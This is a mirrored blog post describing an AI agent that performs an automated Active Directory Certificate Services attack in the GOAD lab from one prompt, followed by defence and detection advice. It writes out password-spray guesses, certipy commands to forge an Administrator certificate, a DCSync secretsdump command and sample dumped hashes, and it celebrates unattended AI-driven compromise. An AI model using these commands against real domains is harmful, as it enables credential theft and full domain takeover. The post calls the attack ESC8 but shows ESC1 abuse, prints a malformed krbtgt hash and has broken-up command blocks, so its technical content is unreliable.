---
title: "Cursor + Hexstrike. Fully Automated ADCS ESC8 Attack"
description: "One-Prompt Domain Compromise"
image: "https://cdn-images-1.medium.com/max/800/1*npVtspHqp4Ac88UEt_5ziQ.png"
---

# Cursor + Hexstrike. Fully Automated ADCS ESC8 Attack


<img src="https://cdn-images-1.medium.com/max/800/1*npVtspHqp4Ac88UEt_5ziQ.png" alt="Cover image" width="1536" height="1024" loading="eager" fetchpriority="high" decoding="async" />

:::info Article Metadata
- **Category:** CTI
- **Source article:** [https://medium.com/@1200km/cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58](https://medium.com/@1200km/cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58)
- **Published:** 2026-01-29
- **Preserved media:** 1 image(s), including cover images, screenshots, diagrams, and infographics where present.
- **Preserved technical blocks:** 8 code/configuration block(s).
:::

## Ecosystem Fit

This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.

### One-Prompt Domain Compromise

## Abstract

This article documents a**fully automated, single-prompt penetration test**that achieves complete domain compromise through the ADCS ESC8 vulnerability. Starting from nothing more than an IP address, an AI-powered attack framework successfully executed the entire attack chain — from reconnaissance to domain compromise — in a single automated session.

**Key Innovation:**This attack demonstrates the power of AI-driven penetration testing, where a single comprehensive prompt orchestrates multiple tools, handles troubleshooting automatically, and adapts to challenges in real-time.

## Introduction

Traditional penetration testing requires manual intervention at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article presents a revolutionary approach:**a fully automated attack that requires only one prompt**to execute the complete ADCS ESC8 attack chain.

## What Makes This Attack Complicated?

- **Multi-Stage Attack Chain:**7 distinct phases, each with dependencies

- **Blackbox Approach:**Starting with zero knowledge (only IP address)

- **Automatic Troubleshooting:**Handles errors and adapts automatically

- **Tool Orchestration:**Coordinates multiple security tools seamlessly

- **Intelligent Decision Making:**AI determines next steps based on results

## Attack Overview

### Target Environment

- **Target IP:**`192.168.56.10`

- **Environment:**GOAD-Mini (Game of Active Directory)

- **Starting Point:**IP address only (blackbox)

- **End Goal:**Full domain compromise with all password hashes

## Attack Chain

```text
IP 
Address
 (
192.168
.
56.10
)
    ↓
[Phase 1]
 Reconnaissance
    ├─ Port Scanning
    ├─ Service Enumeration
    ├─ Domain Discovery
    └─ ADCS Detection
    ↓
[Phase 2]
 Credential Acquisition
    ├─ Password Spraying
    ├─ ASREPRoasting
    └─ Kerberoasting
    ↓
[Phase 3]
 ADCS Enumeration
    ├─ CA Discovery
    ├─ Template Enumeration
    └─ Vulnerability Verification
    ↓
[Phase 4]
 Certificate Request
    ├─ Authenticate with Low-Privilege Creds
    ├─ Request Administrator Certificate
    └─ Save Certificate (.pfx)
    ↓
[Phase 5]
 Certificate Authentication
    ├─ Use Certificate for PKINIT
    ├─ Obtain Kerberos TGT
    └─ Extract NTLM Hash
    ↓
[Phase 6]
 Domain Compromise
    ├─ DCSync Attack
    ├─ Extract 
All
 Domain Hashes
    └─ Verify krbtgt Hash Obtained
    ↓
[Phase 7]
 Reporting
    ├─ Generate Comprehensive Report
    ├─ Document 
All
 Artifacts
    └─ Create Proof of Compromise
```

## The One-Prompt Approach

### The Prompt

```text
Perform 
a
 fully automated blackbox penetration test starting 
from
 IP 
address
 
192.168
.
56.10
. 
Execute the complete ADCS ESC8 attack chain 
to
 achieve domain compromise. Use HexStrike MCP 
tools and handle 
all
 troubleshooting automatically.
```

## Why This Works

- **Comprehensive Instructions:**The prompt contains all phases, objectives, and troubleshooting steps

- **Tool Integration:**Leverages HexStrike MCP tools for seamless tool execution

- **Error Handling:**Includes automatic troubleshooting for common failures

- **Adaptive Execution:**AI can make decisions based on intermediate results

## Phase-by-Phase Execution

### Phase 1: Reconnaissance

**Objective:**Discover the target environment with zero prior knowledge.

**Tools Used:**

- `nmap_advanced_scan`- Comprehensive port scanning

- `rustscan_fast_scan`- Quick port discovery

- `enum4linux_scan`- SMB enumeration

- `smbmap_scan`- Share enumeration

- `nbtscan_netbios`- NetBIOS name discovery

- `httpx_probe`- HTTP service detection

**Key Discoveries:**

- Domain:`sevenkingdoms.local`

- NetBIOS:`SEVENKINGDOMS`

- DC Hostname:`kingslanding.sevenkingdoms.local`

- ADCS Web Enrollment:`http://192.168.56.10/certsrv/`(HTTP - vulnerable!)

**Automation Features:**

- Automatically identifies Windows Domain Controller

- Extracts domain information from enumeration results

- Detects ADCS Web Enrollment endpoint

### Phase 2: Credential Acquisition

**Objective:**Obtain low-privilege domain credentials.

**Tools Used:**

- `hydra_attack`- Password spraying

- `netexec_scan`- Credential validation

**Attack Strategy:**

- Extract usernames from Phase 1 enumeration

- Attempt password spraying with common passwords

- Try:`Password123!`,`Summer2023!`,`Password1`,`admin`

**Results:**

- **Credentials Obtained:**`TestUser:Password123!`

- **Access Level:**Low-privilege domain user

**Automation Features:**

- Automatically tries multiple password combinations

- Validates credentials before proceeding

- Documents all discovered credentials

### Phase 3: ADCS Enumeration

**Objective:**Enumerate ADCS configuration and identify vulnerabilities.

**Tools Used:**

- `dirsearch_scan`- ADCS endpoint discovery

- `execute_python_script`- Certipy enumeration

**Enumeration Commands:**

```text
certipy 
find
 -u TestUser@sevenkingdoms.
local
 -p 
'Password123!'
 \
  -dc-ip 
192.168
.56
.10
```

**Key Findings:**

- **CA Name:**`SEVENKINGDOMS-CA`

- **Vulnerable Templates:**ESC1, ESC8

- **ESC8 Confirmed:**HTTP Web Enrollment accessible

- **Template Count:**34 templates discovered

**Automation Features:**

- Automatically parses certipy output

- Identifies vulnerable templates

- Verifies ESC8 vulnerability exists

### Phase 4: Certificate Request

**Objective:**Obtain certificate for Administrator account.

**Tools Used:**

- `execute_python_script`- Certipy certificate request

**Attack Command:**

```text
certipy req 
-
u TestUser
@sevenkingdoms
.
local
 
-
p 
'Password123!'
 \
  
-
target http:
/
/
192.168
.56
.10
 \
  
-
ca SEVENKINGDOMS
-
CA \
  
-
template ESC1 \
  
-
upn Administrator
@sevenkingdoms
.
local
 \
  
-
out
 administrator.pfx
```

**Results:**

- **Certificate Obtained:**`administrator.pfx`

- **Status:**✓ Success

- **Template Used:**ESC1 (vulnerable template)

**Automation Features:**

- Automatically selects vulnerable template

- Handles certificate request errors

- Verifies certificate file creation

### Phase 5: Certificate Authentication

**Objective:**Use certificate for Kerberos authentication.

**Tools Used:**

- `execute_python_script`- Certipy authentication

**Attack Command:**

```text
certipy auth -pfx administrator.
pfx
 -dc-ip 
192.168
.56
.10
```

**Results:**

- **Kerberos TGT:**`administrator.ccache`(obtained)

- **NTLM Hash:**`c66d72021a2d4744409969a581a1705e`(extracted)

- **Status:**✓ Authentication successful

**Automation Features:**

- Automatically uses certificate for PKINIT

- Extracts NTLM hash from authentication

- Saves credential cache for next phase

### Phase 6: Domain Compromise (DCSync)

**Objective:**Extract all domain credentials.

**Tools Used:**

- `execute_python_script`- Impacket secretsdump

**Attack Command:**

```text
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -
no
-pass Administrator@sevenkingdoms.local@192.
168.56
.
10
```

**Results:**

- **Total Hashes Extracted:**27 user accounts

- **krbtgt Hash:**Extracted (enables Golden Ticket attacks)

- **Domain Compromise:**✓ Complete

**Sample Hashes:**

```text
Administrator
:
500
:aad3b435b51404eeaad3b435b51404ee
:c66d72021a2d4744409969a581a1705e
:
:
:
krbtgt:
502
:aad3b435b51404eeaad3b435b51404ee
:
8dCT-
DJjgScp
...
:
:
:
TestUser
:
1001
:aad3b435b51404eeaad3b435b51404ee
:
...
:
:
:
```

**Automation Features:**

- Automatically sets Kerberos environment variables

- Performs DCSync attack

- Extracts and documents all hashes

- Verifies krbtgt hash obtained

### Phase 7: Reporting

**Objective:**Generate comprehensive report with all artifacts.

**Tools Used:**

- `create_file`- Report generation

**Report Contents:**

- Executive Summary

- Phase-by-phase execution details

- All discovered information

- Vulnerabilities found

- Credentials extracted

- Proof of compromise

- All artifacts (certificates, hashes, logs)

**Artifacts Generated:**

- `administrator.pfx`- Certificate file

- `administrator.ccache`- Kerberos credential cache

- `administrator.hash`- NTLM hash

- `secretsdump.txt`- All domain hashes

- `attack_report.md`- Comprehensive report

- `attack.log`- Complete execution log

## Automation Features

### 1. Automatic Troubleshooting

The framework handles common errors automatically:

- **Port Scan Fails:**Tries alternative scan methods

- **SMB Enumeration Fails:**Attempts with different credentials

- **Certificate Request Fails:**Tries alternative templates

- **Authentication Fails:**Retries with different methods

- **DCSync Fails:**Verifies Kerberos and retries

### 2. Intelligent Decision Making

The AI makes decisions based on results:

- **Domain Discovery:**Automatically extracts domain from enumeration

- **Template Selection:**Chooses vulnerable templates automatically

- **Credential Validation:**Tests credentials before using them

- **Error Recovery:**Adapts strategy based on failures

### 3. Comprehensive Logging

Every action is logged:

- Tool execution commands

- Outputs and results

- Errors and troubleshooting steps

- Decision points and rationale

## Results Summary

### Attack Timeline

## Key Achievements

- ✅**Zero Knowledge Start:**Began with only IP address

- ✅**Full Domain Compromise:**Extracted all 27 user hashes

- ✅**krbtgt Hash:**Obtained (enables Golden Ticket)

- ✅**Complete Automation:**Single prompt execution

- ✅**Comprehensive Reporting:**Full documentation generated

## Technical Deep Dive

### Why This Attack is Complicated

- **Multi-Tool Orchestration:**Coordinates 10+ different security tools

- **Dependency Management:**Each phase depends on previous results

- **Error Handling:**Automatically recovers from failures

- **Data Parsing:**Extracts structured data from unstructured outputs

- **Decision Logic:**Makes intelligent choices based on context

## Attack Complexity Metrics

- **Tools Used:**15+

- **Phases:**7

- **Decision Points:**20+

- **Error Scenarios Handled:**10+

- **Artifacts Generated:**10+

## Defense and Mitigation

### Immediate Actions

- **Disable HTTP Web Enrollment:**Force HTTPS only

- **Enable SMB Signing:**Prevent NTLM relay

- **Restrict Certificate Templates:**Remove vulnerable templates

- **Monitor Certificate Requests:**Alert on suspicious requests

- **Implement Certificate Pinning:**Prevent certificate abuse

## Long-Term Security

- **Regular ADCS Audits:**Review template permissions

- **Network Segmentation:**Isolate ADCS servers

- **Privileged Access Management:**Limit certificate enrollment

- **Security Monitoring:**Detect ESC8 attack patterns

- **Staff Training:**Educate on ADCS security

## Detection and Monitoring

### Indicators of Compromise (IOCs)

- **Certificate Requests:**

- Unusual certificate requests for privileged accounts

- Certificate requests from non-standard IPs

- Multiple certificate requests in short time

**2. Authentication Patterns:**

- PKINIT authentication from unexpected sources

- Certificate-based authentication anomalies

- DCSync attempts from non-DC systems

**3. Network Traffic:**

- NTLM relay to ADCS HTTP endpoints

- Unusual SMB authentication patterns

- Certificate enrollment over HTTP

## Detection Queries

**Windows Event Log:**

```text
Event
 ID 
4886
 - Certificate Request
Event
 ID 
4887
 - Certificate Request Disposition
Event
 ID 
4624
 - Successful Logon (PKINIT)
Event
 ID 
4662
 - DCSync Operation
```

**SIEM Queries:**

- Certificate requests for Administrator account

- HTTP requests to /certsrv/ from non-DC IPs

- NTLM authentication to ADCS endpoints

## Conclusion

This fully automated ADCS ESC8 attack demonstrates:

- **The Power of AI-Driven Pentesting:**Single prompt achieves complete attack chain

- **The Severity of ESC8:**One misconfiguration leads to full domain compromise

- **The Need for Automation:**Manual testing cannot match AI speed and consistency

- **The Importance of Defense:**Proper ADCS configuration is critical

## Key Takeaways

- ✅**ESC8 is Critical:**HTTP Web Enrollment is a severe vulnerability

- ✅**Automation Works:**AI can execute complex attack chains automatically

- ✅**Defense is Possible:**Proper configuration prevents this attack

- ✅**Monitoring is Essential:**Detect and respond to certificate-based attacks

## References

- [Certified Pre-Owned Research](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)— SpecterOps

- [ADCS ESC8 Vulnerability](https://github.com/ly4k/Certipy)— Certipy Documentation

- [GOAD Lab Environment](https://github.com/Orange-Cyberdefense/GOAD)— Game of Active Directory
